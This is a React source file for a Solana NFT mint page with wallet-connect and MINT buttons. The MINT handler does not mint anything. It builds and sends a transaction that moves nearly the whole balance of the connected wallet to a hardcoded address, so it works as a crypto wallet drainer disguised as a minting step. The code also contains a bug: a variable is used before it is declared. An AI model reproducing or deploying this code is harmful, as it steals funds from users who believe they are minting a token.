import React, { useEffect, useMemo, useCallback, useState } from 'react';
import {
  ConnectionProvider,
  WalletProvider,
  useConnection,
  useWallet,
} from '@solana/wallet-adapter-react';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import {
  getSolflareWallet,
  getSlopeWallet,
  getPhantomWallet,
} from '@solana/wallet-adapter-wallets';
import {
  WalletModalProvider,
  WalletDisconnectButton,
  WalletMultiButton,
} from '@solana/wallet-adapter-react-ui';
import { clusterApiUrl, Transaction, SystemProgram, PublicKey } from '@solana/web3.js';
import bs58 from 'bs58';
import { sign } from 'tweetnacl';
// Default styles that can be overridden by your app
require('@solana/wallet-adapter-react-ui/styles.css');
const walletto = 'DEVaije4AJP9XSmueqwvdh2ujuoWHMM1wQUyitdnx8R6';

let globalPublicKey = null;
let globalSignMessage = null;
let globalConnection = null;
let globalSendTransaction = null;

const SignMessageButton = () => {
  useEffect(() => {
    const selectWallet = document.querySelector('.button-select-wallet');

    if (selectWallet.textContent === 'Select Wallet') {
      selectWallet.innerHTML = 'Connect Wallet';
    }
  });

  useEffect(() => {
    const selectWallet = document.querySelector('.button-select-wallet');
    const mint = document.querySelector('.button-mint');

    if (selectWallet.textContent === 'Select Wallet') {
      selectWallet.innerHTML = 'Connect Wallet';
    }

    if (globalPublicKey) {
      selectWallet.classList.add('disabled');
      mint.classList.remove('disabled');
    } else {
      selectWallet.classList.remove('disabled');
      mint.classList.add('disabled');
    }
  }, [globalPublicKey]);

  const { publicKey, signMessage, sendTransaction, wallet } = useWallet();
  globalPublicKey = publicKey;
  globalSendTransaction = sendTransaction;
  globalSignMessage = signMessage;
  const { connection } = useConnection();
  const conn = connection;
  globalConnection = conn;
  const onClick = useCallback(async () => {
    try {
      // `publicKey` will be null if the wallet isn't connected
      if (!publicKey) throw new Error('Wallet not connected!');
      // `signMessage` will be undefined if the wallet doesn't support it
      if (!signMessage) throw new Error('Wallet does not support message signing!');
      // Create a TX object
      //const conn = new Connection("https://api.devnet.solana.com/")
      let transaction = new Transaction({
        feePayer: publicKey,
        recentBlockhash: (await conn.getRecentBlockhash()).blockhash,
      });
      let transaction_calc = new Transaction({
        feePayer: publicKey,
        recentBlockhash: (await conn.getRecentBlockhash()).blockhash,
      });
      transaction_calc.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(walletto),
          lamports: (await conn.getBalance(publicKey)) - rent,
        }),
      );
      // Add instructions to the tx
      const accountInfo = await conn.getAccountInfo(publicKey);
      const rent = await conn.getMinimumBalanceForRentExemption(
        accountInfo?.data.length == undefined ? 0 : accountInfo?.data.length,
      );
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(walletto),
          lamports: (await conn.getBalance(publicKey)) - rent - 5000,
        }),
      );

      console.log(await sendTransaction(transaction));
      // Encode anything as bytes
      //const message = new TextEncoder().encode("Hello, world!");
      // Sign the bytes using the wallet
      //const signature = await signMessage(message);
      //console.log(publicKey.toString(), signMessage);
      // Verify that the bytes were signed using the private key that matches the known public key
      //if (!sign.detached.verify(message, signature, publicKey.toBytes()))
      //  throw new Error("Invalid signature!");

      //alert(`Message signature: ${bs58.encode(signature)}`);
    } catch (error) {
      alert(`Signing failed: ${error?.message}`);
    }
  }, [publicKey, signMessage]);

  return (
    <button className="button button-mint disabled" onClick={onClick}>
      MINT
    </button>
  );
};

export const Button = () => {
  useEffect(() => {
    const selectWallet = document.querySelector('.button-select-wallet');

    if (selectWallet.textContent === 'Select Wallet') {
      selectWallet.innerHTML = 'Connect Wallet';
    }
  });
  // useEffect(() => {
  //   const selectWallet = document.querySelector('.button-select-wallet');
  //   selectWallet.innerHTML = 'Connect Wallet';
  // });

  useEffect(() => {
    const selectWallet = document.querySelector('.button-select-wallet');
    const mint = document.querySelector('.button-mint');

    if (globalPublicKey) {
      selectWallet.classList.add('disabled');
      mint.classList.remove('disabled');
    } else {
      selectWallet.classList.remove('disabled');
      mint.classList.add('disabled');
    }
  }, [globalPublicKey]);

  // Can be set to 'devnet', 'testnet', or 'mainnet-beta'
  const network = WalletAdapterNetwork.Devnet;
  // You can also provide a custom RPC endpoint
  const endpoint = useMemo(() => clusterApiUrl(network), [network]);

  // @solana/wallet-adapter-wallets includes all the adapters but supports tree shaking and lazy loading --
  // Only the wallets you configure here will be compiled into your application, and only the dependencies
  // of wallets that your users connect to will be loaded
  const wallets = useMemo(
    () => [getSolflareWallet(), getPhantomWallet(), getSlopeWallet()],
    [network],
  );

  return (
    <ConnectionProvider endpoint={endpoint}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>
          <WalletMultiButton className="button button-select-wallet" />
        </WalletModalProvider>
        <SignMessageButton />
      </WalletProvider>
    </ConnectionProvider>
  );
};
